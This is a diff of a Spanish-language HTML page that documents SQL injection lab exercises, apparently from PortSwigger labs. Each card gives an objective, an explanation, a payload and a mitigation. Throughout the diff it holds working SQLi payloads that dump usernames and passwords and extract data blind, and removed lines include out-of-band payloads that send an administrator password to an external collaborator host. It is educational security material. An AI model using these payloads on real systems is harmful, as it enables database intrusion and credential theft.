@@ -335,24 +335,24 @@
                             </div>
                         </div>
 
-                        <!-- PHASE 2 -->
-                        <h2 class="phase-header"><i class="fas fa-shield-alt"></i> BLOQUE 2: Ataques de Unión (Exfiltración)</h2>
+                                                <!-- PHASE 2 -->
+                        <h2 class="phase-header"><i class="fas fa-shield-alt"></i> Fase 2: Enumeración y Exfiltración (UNION-Based)</h2>
 
                         <div class="lab-card">
                             <div class="lab-header">
-                                <h3>3. Lab: SQL injection UNION attack, determining the number of columns returned by the query</h3>
+                                <h3>3. Lab: SQL injection attack, querying the database type and version on OracleAppretince</h3>
                                 <div class="lab-badge" style="background:#d35400;">Practitioner</div>
-                                <div class="lab-badge" style="background:#8e44ad;">UNION-based</div>
+                                <div class="lab-badge" style="background:#8e44ad;">UNION-Based In-band</div>
                             </div>
                             <div class="lab-details">
-                                <p><strong>Objetivo:</strong> Identificar cuántas columnas maneja la consulta original mediante errores.</p>
-                                <p><strong>Explicación Técnica:</strong> Se utiliza ORDER BY para medir el índice de columnas hasta que el servidor devuelva un error, revelando la estructura interna.</p>
+                                <p><strong>Objetivo:</strong> Obtener la versión de la base de datos Oracle.</p>
+                                <p><strong>Explicación Técnica:</strong> Falta de sanitización permite alterar la consulta para acceder a la vista del sistema v`$version.</p>
                                 <div class="payload-box">
-                                    <strong>Payload:</strong><br />
-                                    ' ORDER BY 3--
+                                    <strong>Explicación del payload:</strong><br />
+                                    '+UNION+SELECT+BANNER,+NULL+FROM+v`$version-- (Une la consulta original con la versión de Oracle, rellenando con NULL la columna faltante).
                                 </div>
                                 <div class="mitigation-box">
-                                    <strong>Mitigación:</strong> Validación de entradas y uso de Web Application Firewalls (WAF) para detectar patrones de ordenamiento.
+                                    <strong>Mitigación:</strong> Consultas parametrizadas (Prepared Statements).
                                 </div>
                                 <div class="evidence-box">
                                     <i class="fas fa-image"></i>
@@ -363,19 +363,19 @@
 
                         <div class="lab-card">
                             <div class="lab-header">
-                                <h3>4. Lab: SQL injection UNION attack, finding a column containing text</h3>
+                                <h3>4. Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft</h3>
                                 <div class="lab-badge" style="background:#d35400;">Practitioner</div>
-                                <div class="lab-badge" style="background:#8e44ad;">UNION-based</div>
+                                <div class="lab-badge" style="background:#8e44ad;">Union-Based</div>
                             </div>
                             <div class="lab-details">
-                                <p><strong>Objetivo:</strong> Localizar una columna que acepte datos de tipo string para mostrar información.</p>
-                                <p><strong>Explicación Técnica:</strong> Se inyectan valores nulos y cadenas de texto en distintas posiciones para observar cuál es renderizada en el HTML.</p>
+                                <p><strong>Objetivo:</strong> Mostrar la versión del sistema gestor (MySQL/MSSQL).</p>
+                                <p><strong>Explicación Técnica:</strong> Entrada no validada en la categoría permite inyectar variables de sistema combinadas con resultados legítimos.</p>
                                 <div class="payload-box">
-                                    <strong>Payload:</strong><br />
-                                    ' UNION SELECT NULL,'abc',NULL--
+                                    <strong>Explicación del payload:</strong><br />
+                                    ' UNION SELECT @@version, NULL# (Extrae la variable global @@version y comenta el resto de la sentencia).
                                 </div>
                                 <div class="mitigation-box">
-                                    <strong>Mitigación:</strong> Aplicar tipado fuerte en el backend para los parámetros recibidos.
+                                    <strong>Mitigación:</strong> Consultas preparadas y validación estricta de entradas.
                                 </div>
                                 <div class="evidence-box">
                                     <i class="fas fa-image"></i>
@@ -386,19 +386,19 @@
 
                         <div class="lab-card">
                             <div class="lab-header">
-                                <h3>5. Lab: SQL injection UNION attack, retrieving data from other tables</h3>
+                                <h3>5. Lab: SQL injection attack, listing the database contents (non-Oracle)</h3>
                                 <div class="lab-badge" style="background:#d35400;">Practitioner</div>
-                                <div class="lab-badge" style="background:#8e44ad;">UNION-based</div>
+                                <div class="lab-badge" style="background:#8e44ad;">Union-Based</div>
                             </div>
                             <div class="lab-details">
-                                <p><strong>Objetivo:</strong> Extraer nombres de usuario y contraseñas de la tabla users.</p>
-                                <p><strong>Explicación Técnica:</strong> Una vez conocida la estructura (2 columnas de texto), se ejecuta un UNION SELECT para volcar la tabla de credenciales.</p>
+                                <p><strong>Objetivo:</strong> Enumerar tablas/columnas y obtener credenciales de administrador.</p>
+                                <p><strong>Explicación Técnica:</strong> Uso de la cláusula UNION para consultar el esquema de información (Information Schema) y volcar tablas ocultas.</p>
                                 <div class="payload-box">
-                                    <strong>Payload:</strong><br />
-                                    ' UNION SELECT username, password FROM users--
+                                    <strong>Explicación del payload:</strong><br />
+                                    ' UNION SELECT username_x, password_y FROM users_z-- (Combina resultados visibles con datos extraídos de la tabla descubierta).
                                 </div>
                                 <div class="mitigation-box">
-                                    <strong>Mitigación:</strong> Restringir permisos de lectura del usuario de BD a tablas estrictamente necesarias.
+                                    <strong>Mitigación:</strong> Consultas parametrizadas y principio de menor privilegio.
                                 </div>
                                 <div class="evidence-box">
                                     <i class="fas fa-image"></i>
@@ -409,19 +409,19 @@
 
                         <div class="lab-card">
                             <div class="lab-header">
-                                <h3>6. Lab: SQL injection UNION attack, retrieving multiple values in a single column</h3>
+                                <h3>6. Lab: SQL injection attack, listing the database contents on Oracle</h3>
                                 <div class="lab-badge" style="background:#d35400;">Practitioner</div>
-                                <div class="lab-badge" style="background:#8e44ad;">UNION-based</div>
+                                <div class="lab-badge" style="background:#8e44ad;">Union-Based</div>
                             </div>
                             <div class="lab-details">
-                                <p><strong>Objetivo:</strong> Extraer múltiples datos en una sola columna usando delimitadores.</p>
-                                <p><strong>Explicación Técnica:</strong> Se utiliza la concatenación (específica del motor, ej. ||) para unir username y password en un solo resultado visual.</p>
+                                <p><strong>Objetivo:</strong> Mapear la base de datos Oracle y extraer credenciales.</p>
+                                <p><strong>Explicación Técnica:</strong> En Oracle se usan vistas del sistema (all_tables, all_tab_columns) en lugar de Information Schema para enumerar la estructura.</p>
                                 <div class="payload-box">
-                                    <strong>Payload:</strong><br />
-                                    ' UNION SELECT NULL, username || '~' || password FROM users--
+                                    <strong>Explicación del payload:</strong><br />
+                                    ' UNION SELECT USERNAME_X, PASSWORD_X FROM USERS_X-- (Extrae las columnas descubiertas previamente).
                                 </div>
                                 <div class="mitigation-box">
-                                    <strong>Mitigación:</strong> Sanitización de caracteres de unión y control de salida de datos (Output Encoding).
+                                    <strong>Mitigación:</strong> Mínimo privilegio y uso de frameworks con ORM seguro.
                                 </div>
                                 <div class="evidence-box">
                                     <i class="fas fa-image"></i>
@@ -430,24 +430,21 @@
                             </div>
                         </div>
 
-                        <!-- PHASE 3 -->
-                        <h2 class="phase-header"><i class="fas fa-search"></i> BLOQUE 3: Fingerprinting de Base de Datos</h2>
-
                         <div class="lab-card">
                             <div class="lab-header">
-                                <h3>7. Lab: SQL injection attack, querying the database type and version on Oracle</h3>
+                                <h3>7. Lab: SQL injection UNION attack, determining the number of columns returned by the query</h3>
                                 <div class="lab-badge" style="background:#d35400;">Practitioner</div>
-                                <div class="lab-badge" style="background:#8e44ad;">In-band (Oracle)</div>
+                                <div class="lab-badge" style="background:#8e44ad;">Union-Based</div>
                             </div>
                             <div class="lab-details">
-                                <p><strong>Objetivo:</strong> Obtener la versión específica del servidor Oracle.</p>
-                                <p><strong>Explicación Técnica:</strong> Oracle requiere que toda consulta SELECT tenga un FROM; se consulta la tabla del sistema v`$version.</p>
+                                <p><strong>Objetivo:</strong> Descubrir el número exacto de columnas de la consulta original.</p>
+                                <p><strong>Explicación Técnica:</strong> UNION exige coincidencia de columnas. Se miden inyectando valores nulos iterativamente hasta evitar un error 500.</p>
                                 <div class="payload-box">
-                                    <strong>Payload:</strong><br />
-                                    ' UNION SELECT banner, NULL FROM v`$version--
+                                    <strong>Explicación del payload:</strong><br />
+                                    '+UNION+SELECT+NULL,NULL,NULL-- (Inyecta valores nulos secuenciales para empatar la estructura original).
                                 </div>
                                 <div class="mitigation-box">
-                                    <strong>Mitigación:</strong> Deshabilitar el acceso público a vistas de administración y metadatos.
+                                    <strong>Mitigación:</strong> Consultas parametrizadas que traten la entrada estrictamente como texto.
                                 </div>
                                 <div class="evidence-box">
                                     <i class="fas fa-image"></i>
@@ -458,19 +455,19 @@
 
                         <div class="lab-card">
                             <div class="lab-header">
-                                <h3>8. Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft</h3>
+                                <h3>8. Lab: SQL injection UNION attack, finding a column containing text</h3>
                                 <div class="lab-badge" style="background:#d35400;">Practitioner</div>
-                                <div class="lab-badge" style="background:#8e44ad;">In-band (MySQL/MSSQL)</div>
+                                <div class="lab-badge" style="background:#8e44ad;">Union-Based</div>
                             </div>
                             <div class="lab-details">
-                                <p><strong>Objetivo:</strong> Identificar la versión en bases de datos que usan variables de sistema.</p>
-                                <p><strong>Explicación Técnica:</strong> Se utiliza la variable global @@version para extraer la información del entorno.</p>
+                                <p><strong>Objetivo:</strong> Identificar qué columnas admiten tipos de datos string (texto).</p>
+                                <p><strong>Explicación Técnica:</strong> Se prueban cadenas literales en cada posición de la inyección para identificar dónde no hay choque de tipos de datos.</p>
                                 <div class="payload-box">
-                                    <strong>Payload:</strong><br />
-                                    ' UNION SELECT @@version, NULL#
+                                    <strong>Explicación del payload:</strong><br />
+                                    '+UNION+SELECT+NULL,+'abc',+NULL-- (Prueba compatibilidad de texto desplazando el valor en cada posición).
                                 </div>
                                 <div class="mitigation-box">
-                                    <strong>Mitigación:</strong> Supresión de errores detallados y banners de versión del servidor.
+                                    <strong>Mitigación:</strong> Validación mediante Listas Blancas (Whitelisting).
                                 </div>
                                 <div class="evidence-box">
                                     <i class="fas fa-image"></i>
@@ -479,24 +476,21 @@
                             </div>
                         </div>
 
-                        <!-- PHASE 4 -->
-                        <h2 class="phase-header"><i class="fas fa-eye-slash"></i> BLOQUE 4: Blind SQLi (Ciega)</h2>
-
                         <div class="lab-card">
                             <div class="lab-header">
-                                <h3>9. Lab: Blind SQL injection with conditional responses</h3>
+                                <h3>9. Lab: SQL injection UNION attack, retrieving data from other tables</h3>
                                 <div class="lab-badge" style="background:#d35400;">Practitioner</div>
-                                <div class="lab-badge" style="background:#8e44ad;">Blind (Boolean)</div>
+                                <div class="lab-badge" style="background:#8e44ad;">Union-Based (Extracción)</div>
                             </div>
                             <div class="lab-details">
-                                <p><strong>Objetivo:</strong> Extraer la contraseña del administrador letra por letra.</p>
-                                <p><strong>Explicación Técnica:</strong> La aplicación solo responde "Welcome back" si la consulta es exitosa; se usa lógica booleana para inferir caracteres.</p>
+                                <p><strong>Objetivo:</strong> Extraer de forma directa usuarios y contraseñas.</p>
+                                <p><strong>Explicación Técnica:</strong> Falla de segmentación que permite a la consulta pública de productos acceder a la tabla confidencial de cuentas.</p>
                                 <div class="payload-box">
-                                    <strong>Payload:</strong><br />
-                                    ' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a
+                                    <strong>Explicación del payload:</strong><br />
+                                    '+UNION+SELECT+username,+password+FROM+users-- (Cruza a la tabla users y vuelca 2 columnas en pantalla).
                                 </div>
                                 <div class="mitigation-box">
-                                    <strong>Mitigación:</strong> Implementar respuestas genéricas que no varíen según el resultado de la consulta.
+                                    <strong>Mitigación:</strong> Separación estricta de permisos de lectura a nivel de base de datos.
                                 </div>
                                 <div class="evidence-box">
                                     <i class="fas fa-image"></i>
@@ -507,19 +501,19 @@
 
                         <div class="lab-card">
                             <div class="lab-header">
-                                <h3>10. Lab: Blind SQL injection with conditional errors</h3>
+                                <h3>10. Lab: SQL injection UNION attack, retrieving multiple values in a single column</h3>
                                 <div class="lab-badge" style="background:#d35400;">Practitioner</div>
-                                <div class="lab-badge" style="background:#8e44ad;">Blind (Error-based)</div>
+                                <div class="lab-badge" style="background:#8e44ad;">Union-Based</div>
                             </div>
                             <div class="lab-details">
-                                <p><strong>Objetivo:</strong> Exfiltrar datos forzando errores internos del servidor.</p>
-                                <p><strong>Explicación Técnica:</strong> Se provoca un error (ej. división por cero) condicionado a que una subconsulta sea verdadera.</p>
+                                <p><strong>Objetivo:</strong> Recuperar múltiples valores cuando solo hay una columna de texto disponible.</p>
+                                <p><strong>Explicación Técnica:</strong> Concatenación lógica a nivel de motor SQL para unir varios campos y burlar la limitación visual.</p>
                                 <div class="payload-box">
-                                    <strong>Payload:</strong><br />
-                                    '||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
+                                    <strong>Explicación del payload:</strong><br />
+                                    union select null, username ||'*'||password from users -- (Une usuario y contraseña separándolos con un asterisco).
                                 </div>
                                 <div class="mitigation-box">
-                                    <strong>Mitigación:</strong> Configurar el servidor para no mostrar stack traces o errores 500 personalizados.
+                                    <strong>Mitigación:</strong> Consultas preparadas.
                                 </div>
                                 <div class="evidence-box">
                                     <i class="fas fa-image"></i>
@@ -528,21 +522,24 @@
                             </div>
                         </div>
 
+                        <!-- PHASE 3 -->
+                        <h2 class="phase-header"><i class="fas fa-eye-slash"></i> Fase 3: Inferencia de Datos (Blind SQLi)</h2>
+
                         <div class="lab-card">
                             <div class="lab-header">
-                                <h3>11. Lab: Blind SQL injection with time delays</h3>
+                                <h3>11. Lab: Blind SQL injection with conditional responses</h3>
                                 <div class="lab-badge" style="background:#d35400;">Practitioner</div>
-                                <div class="lab-badge" style="background:#8e44ad;">Blind (Time-based)</div>
+                                <div class="lab-badge" style="background:#8e44ad;">Blind SQLi</div>
                             </div>
                             <div class="lab-details">
-                                <p><strong>Objetivo:</strong> Confirmar vulnerabilidad mediante pausas en la respuesta del servidor.</p>
-                                <p><strong>Explicación Técnica:</strong> Se inyectan funciones de retardo (pg_sleep, WAITFOR DELAY) para verificar la ejecución de comandos sin respuesta visual.</p>
+                                <p><strong>Objetivo:</strong> Extraer la clave infiriendo caracteres basados en mensajes condicionales.</p>
+                                <p><strong>Explicación Técnica:</strong> La vulnerabilidad en la cookie altera el comportamiento de la página (muestra "Welcome back!") solo si la condición es verdadera.</p>
                                 <div class="payload-box">
-                                    <strong>Payload:</strong><br />
-                                    '; IF (1=1) WAITFOR DELAY '0:0:10'--
+                                    <strong>Explicación del payload:</strong><br />
+                                    ' and (select substring(password,1,1) from users...)='a' -- (Comprueba si la primera letra es 'a', iterando el proceso).
                                 </div>
                                 <div class="mitigation-box">
-                                    <strong>Mitigación:</strong> Monitorear tiempos de respuesta inusuales y usar consultas preparadas.
+                                    <strong>Mitigación:</strong> Evitar variar respuestas de la interfaz según el éxito de procesos internos.
                                 </div>
                                 <div class="evidence-box">
                                     <i class="fas fa-image"></i>
@@ -553,19 +550,19 @@
 
                         <div class="lab-card">
                             <div class="lab-header">
-                                <h3>12. Lab: Blind SQL injection with time delays and information retrieval</h3>
+                                <h3>12. Lab: Blind SQL injection with conditional errors</h3>
                                 <div class="lab-badge" style="background:#d35400;">Practitioner</div>
-                                <div class="lab-badge" style="background:#8e44ad;">Blind (Time-based)</div>
+                                <div class="lab-badge" style="background:#8e44ad;">Blind SQLi (Error-based)</div>
                             </div>
                             <div class="lab-details">
-                                <p><strong>Objetivo:</strong> Recuperar credenciales basándose en el tiempo de espera.</p>
-                                <p><strong>Explicación Técnica:</strong> Se instruye a la BD a esperar 10 segundos solo si un carácter de la contraseña coincide con la prueba.</p>
+                                <p><strong>Objetivo:</strong> Exfiltrar datos forzando errores 500 controlados.</p>
+                                <p><strong>Explicación Técnica:</strong> Manipulación de cookie en Oracle para generar un fallo matemático intencional condicionado a una verdad lógica.</p>
                                 <div class="payload-box">
-                                    <strong>Payload:</strong><br />
-                                    '%3bIF+(username='administrator'+AND+substring(password,1,1)='a')+WAITFOR+DELAY+'0:0:10'--
+                                    <strong>Explicación del payload:</strong><br />
+                                    '|| (select case when (...) then to_char(1/0) else '' end...) ||' (Fuerza división por cero si la letra probada es correcta).
                                 </div>
                                 <div class="mitigation-box">
-                                    <strong>Mitigación:</strong> Implementar Rate Limiting para mitigar ataques de fuerza bruta por tiempo.
+                                    <strong>Mitigación:</strong> Parametrización y supresión de errores detallados de base de datos.
                                 </div>
                                 <div class="evidence-box">
                                     <i class="fas fa-image"></i>
@@ -574,24 +571,21 @@
                             </div>
                         </div>
 
-                        <!-- PHASE 5 -->
-                        <h2 class="phase-header"><i class="fas fa-vr-cardboard"></i> BLOQUE 5: Técnicas de Evasión y Out-of-Band</h2>
-
                         <div class="lab-card">
                             <div class="lab-header">
-                                <h3>13. Lab: Blind SQL injection with out-of-band interaction</h3>
+                                <h3>13. Lab: Visible error-based SQL injection.</h3>
                                 <div class="lab-badge" style="background:#d35400;">Practitioner</div>
-                                <div class="lab-badge" style="background:#8e44ad;">Out-of-band (OAST)</div>
+                                <div class="lab-badge" style="background:#8e44ad;">Error-based</div>
                             </div>
                             <div class="lab-details">
-                                <p><strong>Objetivo:</strong> Confirmar vulnerabilidad mediante una solicitud externa DNS/HTTP.</p>
-                                <p><strong>Explicación Técnica:</strong> Se utiliza la base de datos para realizar una petición a un dominio controlado por el atacante (Burp Collaborator).</p>
+                                <p><strong>Objetivo:</strong> Imprimir la contraseña directamente en un mensaje de error del servidor.</p>
+                                <p><strong>Explicación Técnica:</strong> Explotación de funciones de conversión de tipos (CAST); al fallar, el motor de BD escupe el dato original en el error.</p>
                                 <div class="payload-box">
-                                    <strong>Payload:</strong><br />
-                                    '+UNION+SELECT+extractvalue(xmltype('&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;!DOCTYPE root [ &lt;!ENTITY % remote SYSTEM "http://ID.burpcollaborator.net/"&gt; %remote;]&gt;'),'/l') FROM dual--
+                                    <strong>Explicación del payload:</strong><br />
+                                    ' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)-- (Falla al convertir el string a entero, revelando el string).
                                 </div>
                                 <div class="mitigation-box">
-                                    <strong>Mitigación:</strong> Restringir el tráfico saliente (egress) del servidor de base de datos.
+                                    <strong>Mitigación:</strong> Desactivar visualización de errores (Error reporting off) en producción.
                                 </div>
                                 <div class="evidence-box">
                                     <i class="fas fa-image"></i>
@@ -602,19 +596,19 @@
 
                         <div class="lab-card">
                             <div class="lab-header">
-                                <h3>14. Lab: Blind SQL injection with out-of-band data exfiltration</h3>
+                                <h3>14. Lab: Blind SQL injection with time delays</h3>
                                 <div class="lab-badge" style="background:#d35400;">Practitioner</div>
-                                <div class="lab-badge" style="background:#8e44ad;">Out-of-band (OAST)</div>
+                                <div class="lab-badge" style="background:#8e44ad;">Time-based Blind</div>
                             </div>
                             <div class="lab-details">
-                                <p><strong>Objetivo:</strong> Extraer la contraseña del administrador fuera de banda.</p>
-                                <p><strong>Explicación Técnica:</strong> Similar al anterior, pero el subdominio de la petición DNS incluye el dato exfiltrado (la contraseña).</p>
+                                <p><strong>Objetivo:</strong> Confirmar vulnerabilidad provocando un retraso exacto de 10 segundos.</p>
+                                <p><strong>Explicación Técnica:</strong> Inyección de funciones de pausa del sistema (como pg_sleep) cuando no hay respuesta visual de la vulnerabilidad.</p>
                                 <div class="payload-box">
-                                    <strong>Payload:</strong><br />
-                                    '+UNION+SELECT+EXTRACTVALUE(xmltype('&lt;%21entity+%25+remote+SYSTEM+"http://'+(SELECT+password+FROM+users+WHERE+username='administrator')+'.burpcollaborator.net/"&gt;%25remote%3b'),'/l')+FROM+dual--
+                                    <strong>Explicación del payload:</strong><br />
+                                    x'|| pg_sleep(10) -- (Instruye directamente al proceso de PostgreSQL a inhabilitarse por 10 segundos).
                                 </div>
                                 <div class="mitigation-box">
-                                    <strong>Mitigación:</strong> Deshabilitar funciones de red en la base de datos si no son necesarias.
+                                    <strong>Mitigación:</strong> Configuración de WAF para bloquear funciones de tiempo y sanitización estricta.
                                 </div>
                                 <div class="evidence-box">
                                     <i class="fas fa-image"></i>
@@ -625,19 +619,19 @@
 
                         <div class="lab-card">
                             <div class="lab-header">
-                                <h3>15. Lab: SQL injection with filter evasion via XML encoding</h3>
+                                <h3>15. Lab: Blind SQL injection with time delays and information retrieval.</h3>
                                 <div class="lab-badge" style="background:#d35400;">Practitioner</div>
-                                <div class="lab-badge" style="background:#8e44ad;">In-band (WAF Bypass)</div>
+                                <div class="lab-badge" style="background:#8e44ad;">Time-based Blind</div>
                             </div>
                             <div class="lab-details">
-                                <p><strong>Objetivo:</strong> Extraer credenciales evadiendo un Firewall (WAF).</p>
-                                <p><strong>Explicación Técnica:</strong> El WAF bloquea palabras clave SQL, pero no inspecciona dentro de entidades XML. Se usa Hackvertor para codificar el payload en hexadecimal.</p>
+                                <p><strong>Objetivo:</strong> Extraer la contraseña midiendo latencias de red.</p>
+                                <p><strong>Explicación Técnica:</strong> Combinación de comandos de retardo y lógica binaria (CASE WHEN) para adivinar caracteres según la demora del servidor.</p>
                                 <div class="payload-box">
-                                    <strong>Payload:</strong><br />
-                                    1 UNION SELECT NULL, username || '~' || password FROM users (Codificado en Hex XML)
+                                    <strong>Explicación del payload:</strong><br />
+                                    SELECT CASE WHEN (condición) THEN pg_sleep(10) ELSE pg_sleep(0) END (Pausa 10s si el carácter adivinado es correcto).
                                 </div>
                                 <div class="mitigation-box">
-                                    <strong>Mitigación:</strong> Configurar el WAF para realizar inspección recursiva y decodificación de múltiples capas.
+                                    <strong>Mitigación:</strong> Parametrización absoluta e implementación de Rate Limiting.
                                 </div>
                                 <div class="evidence-box">
                                     <i class="fas fa-image"></i>
@@ -646,59 +640,62 @@
                             </div>
                         </div>
 
+                        <!-- PHASE 4 -->
+                        <h2 class="phase-header"><i class="fas fa-vr-cardboard"></i> Fase 4: Exfiltración Externa y Evasión</h2>
+
                         <div class="lab-card">
                             <div class="lab-header">
-                                <h3>16. Lab: SQL injection vulnerability in UNION attack, listing the database contents on Oracle</h3>
+                                <h3>16. Lab: Blind sql injection with out-of-band interaction</h3>
                                 <div class="lab-badge" style="background:#d35400;">Practitioner</div>
-                                <div class="lab-badge" style="background:#8e44ad;">UNION-based</div>
+                                <div class="lab-badge" style="background:#8e44ad;">Out-of-Band (OAST)</div>
                             </div>
                             <div class="lab-details">
-                                <p><strong>Objetivo:</strong> Mapear tablas y columnas en un entorno Oracle.</p>
-                                <p><strong>Explicación Técnica:</strong> Uso de tablas de esquema como all_tables y all_tab_columns para descubrir la arquitectura de datos.</p>
+                                <p><strong>Objetivo:</strong> Confirmar inyección ciega forzando una petición DNS externa.</p>
+                                <p><strong>Explicación Técnica:</strong> Uso de funcionalidades de conexión de red de la base de datos para resolver un dominio controlado por el atacante (Burp Collaborator).</p>
                                 <div class="payload-box">
-                                    <strong>Payload:</strong><br />
-                                    ' UNION SELECT table_name, NULL FROM all_tables--
+                                    <strong>Explicación del payload:</strong><br />
+                                    '||(SELECT ... FROM ... )-- (Subconsulta embebida que contiene el dominio externo para forzar el DNS Lookup).
                                 </div>
                                 <div class="mitigation-box">
-                                    <strong>Mitigación:</strong> Enmascaramiento de datos y restricción de acceso al catálogo del sistema.
+                                    <strong>Mitigación:</strong> Restringir conexiones salientes (Egress filtering) a nivel de servidor de BD.
                                 </div>
                             </div>
                         </div>
 
                         <div class="lab-card">
                             <div class="lab-header">
-                                <h3>17. Lab: SQL injection vulnerability in UNION attack, listing the database contents on non-Oracle databases</h3>
+                                <h3>17. Lab: Blind sql injection with out-of-band data exfiltration</h3>
                                 <div class="lab-badge" style="background:#d35400;">Practitioner</div>
-                                <div class="lab-badge" style="background:#8e44ad;">UNION-based</div>
+                                <div class="lab-badge" style="background:#8e44ad;">Out-of-Band (OAST)</div>
                             </div>
                             <div class="lab-details">
-                                <p><strong>Objetivo:</strong> Listar tablas en MySQL/PostgreSQL/MSSQL.</p>
-                                <p><strong>Explicación Técnica:</strong> Consulta a la base de datos estándar information_schema.tables para extraer nombres de tablas creadas por el usuario.</p>
+                                <p><strong>Objetivo:</strong> Extraer la contraseña enviándola a un servidor externo.</p>
+                                <p><strong>Explicación Técnica:</strong> El dato robado se inserta como prefijo (subdominio) en la solicitud DNS generada hacia la infraestructura del atacante.</p>
                                 <div class="payload-box">
-                                    <strong>Payload:</strong><br />
-                                    ' UNION SELECT table_name, NULL FROM information_schema.tables--
+                                    <strong>Explicación del payload:</strong><br />
+                                    '||(SELECT password...) || '.dominio-colaborador'-- (La base de datos resuelve el dominio enviando consigo la clave en la URL).
                                 </div>
                                 <div class="mitigation-box">
-                                    <strong>Mitigación:</strong> Deshabilitar el acceso al information_schema para usuarios de aplicaciones web.
+                                    <strong>Mitigación:</strong> Reglas de firewall interno para bloquear toda resolución de nombres no esencial.
                                 </div>
                             </div>
                         </div>
 
                         <div class="lab-card">
                             <div class="lab-header">
-                                <h3>18. Lab: Visible error-based SQL injection</h3>
+                                <h3>18. Lab: SQL injection with filter bypass via xml encoding</h3>
                                 <div class="lab-badge" style="background:#d35400;">Practitioner</div>
-                                <div class="lab-badge" style="background:#8e44ad;">Error-based</div>
+                                <div class="lab-badge" style="background:#8e44ad;">WAF Bypass</div>
                             </div>
                             <div class="lab-details">
-                                <p><strong>Objetivo:</strong> Exfiltrar datos a través de mensajes de error visibles en la interfaz.</p>
-                                <p><strong>Explicación Técnica:</strong> Se provoca un error de conversión de datos que obliga a la base de datos a mostrar el resultado de una subconsulta dentro del mensaje de error.</p>
+                                <p><strong>Objetivo:</strong> Burlar el Firewall de Aplicaciones Web (WAF) para inyectar sentencias.</p>
+                                <p><strong>Explicación Técnica:</strong> El WAF bloquea sintaxis SQL en texto plano, pero ignora entidades codificadas en XML Hexagonal, las cuales el backend sí procesa.</p>
                                 <div class="payload-box">
-                                    <strong>Payload:</strong><br />
-                                    ' AND CAST((SELECT password FROM users LIMIT 1) AS int)--
+                                    <strong>Explicación del payload:</strong><br />
+                                    UNION SELECT username || ':' || password FROM users (Totalmente ofuscado usando Hackvertor en formato XML Hex).
                                 </div>
                                 <div class="mitigation-box">
-                                    <strong>Mitigación:</strong> Desactivar la visualización de errores detallados en producción (Display Errors = Off).
+                                    <strong>Mitigación:</strong> Configurar el WAF con capacidad de decodificación profunda de múltiples capas (Deep Inspection).
                                 </div>
                             </div>
                         </div>
